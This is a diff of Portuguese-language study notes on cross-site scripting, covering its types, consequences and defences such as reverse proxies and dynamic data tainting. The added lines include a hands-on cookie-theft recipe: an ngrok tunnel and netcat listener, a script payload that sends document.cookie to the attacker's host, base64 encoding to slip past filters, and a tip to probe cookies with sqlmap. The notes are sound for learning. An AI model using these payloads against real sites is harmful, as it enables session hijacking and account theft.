@@ -22,50 +22,62 @@ injeção de código XSS:
 	--> Utiliza o JS do navegador e permite que o atacante ( executor ) envie dados não confiáveis para o servidor.
         --> isso acontece por falta de validação de dados na entrada, o navegador acaba permitindo a execussão do código malicioso. <--
   
-	-- > parâmetros de uma URL são alterados para um código malicioso e encaminha para a vítima. O navegador no computador da vítima interpreterá os 	códigos injetados. 
-	ex: http://www.meuforum.com/?p=abc
-	URL com codigo malicioso: http://www.meuforum.com/?p=<img src='codigomalicioso.jpg' onError=alert("XSS"):>
-				*nesse caso, não há uma validação nos valores atribuídos ao parâmetro "p".* 
+	-- > parâmetros de uma URL são alterados para um código malicioso e encaminha para a vítima. O navegador no computador da vítima interpreterá os 	códigos injetados nos posts: 
+	ex:
+	<script>alert("teste")</script>
+	<script>alert("Cookies which do not have the HTTPOnly attribute set: " + document.cookie);</script>
+				
 
 3 tipos de XSS:
    --- >> 1) Persistente.
-   --- >> Vai acontecer no formulário ( onde acontece a comunicação da API com o cliente-servidor ) a inserção de código 		malicioso que fará uma requisição ao banco de dados ( servidor ) que trará resultado ( persiste ) e pode ser 	     retornando um valor ( recuperado por qualquer usuário da aplicação ). 
-	--- >> exemplo:
-		<script>alert("XSS");</script>
+   --- >> Vai acontecer no formulário ( onde acontece a comunicação da API com o cliente-servidor ) a inserção de código malicioso que fará uma requisição ao banco de dados ( servidor ) que trará resultado ( persiste ). Ou seja o código malicioso foi injetado no servidor.
+
 Consequências:
 	--- >> a consequência mais crítica do xss é o roubo de cookies para logar na sessão de login do usuário.
-		ex para pesquisar: Samy Kankar 
-	
-1) Forma direta: 
-	exemplo: 
-		<b>Title</b>
-	técnica de Escape: 
-		"&ltb&gtTeste&lt/b&gt"
-		
---- >> Técnicas de defesa: << ---
-	1) Analisar todas as requisições feitas pelos computadores. Seria feita uma interceptação da requisição antes de ir para internet. 
 
-	2 ) -- Proxy reverso. 
+Na prática: 
+	exemplo 1: 
+	usando ngrok + netcat 			
+	./ngrok htpp 80  
+	nc -lvp 80 
+	
+	injeção do script no post(formulário) 
+		<script> new Image().src="ip(ngrok)/?cookie="+document.cookie</script>
+		
+	Bypass do script injetado: 
+		- > Podemos utilizar a função atob do javascript para poder encrypt a injeção do nosso código 
+	btoa (<script> new Image().src="ip(ngrok)/?cookie="+document.cookie</script>) encryp
+	atob () decryp
+	
+	ápos interceptar o cookie podemos utilizar o burpsuit para manipulação de cookie. 
+	Dica: Podemos verificar a injeção sqlinjection nos cookies usando sqlmap ou manualmente. 
+		se o cookie possuir o parametro
+	
+
+--- >> Técnicas de defesa: << ---
+	1) Analisar todas as requisições feitas pelos computadores. Seria feita uma interceptação da requisição antes de ir para internet. ( proxy )  
+
+	 --> Proxy reverso. 
 	cliente -------------- >> proxy reverso ------------- >> internet -------------------- >> servidor  
 		-- > as requisições do cliente seram interceptadas pelo proxy que irá aplicar um conjunto de técnicas e depois passadas a internet.
 			 
+	
+	-- > Você permite que um serviço terceiro ( proxy ) controle seu trafego. Quem fará o request é o proxy. Quem recebe o response é o proxy.
+	-> o Servidor pode filtrar ou não essa requisição feita pelo proxy
+	uma vez que é um serviço terceiro.
+
 	3 ) -- Dynamic Data Tainting 
 	
 	cliente --------------- >> internet ---------------- >> servidor
 	cliente << --------------- internet << ---------------- servidor 
-	--- >	Durante a renderização da página no navegador do cliente, acontecerá o monitoramento de código JavaScript, e 
+	--- > Durante a renderização da página no navegador do cliente, acontecerá o monitoramento de código JavaScript, e 
 	possibilitanto uma resposta de execução ou não da página. 
 
 
 Proxy: 
 
 	CLIENTE     --------------------> PROXY --------------------- > SERVIDOR 
-	NAVEGADOR                        TRÁFEGO                cliente, ip_port_cliente = servidor.accept()
-
---> Você permite que um serviço terceiro ( proxy ) controle seu trafego. 
-	-> Quem fará o request é o proxy. Quem recebe o response é o proxy.
-	-> o Servidor pode filtrar ou não essa requisição feita pelo proxy
-	uma vez que é um serviço terceiro.
+	NAVEGADOR                        TRÁFEGO               
 
 	exemplos de proxy: burpsuit é um proxy. Você faz a requisição e a requisição passa pelo burp que também altera a resposta do servidor para o cliente. 
 
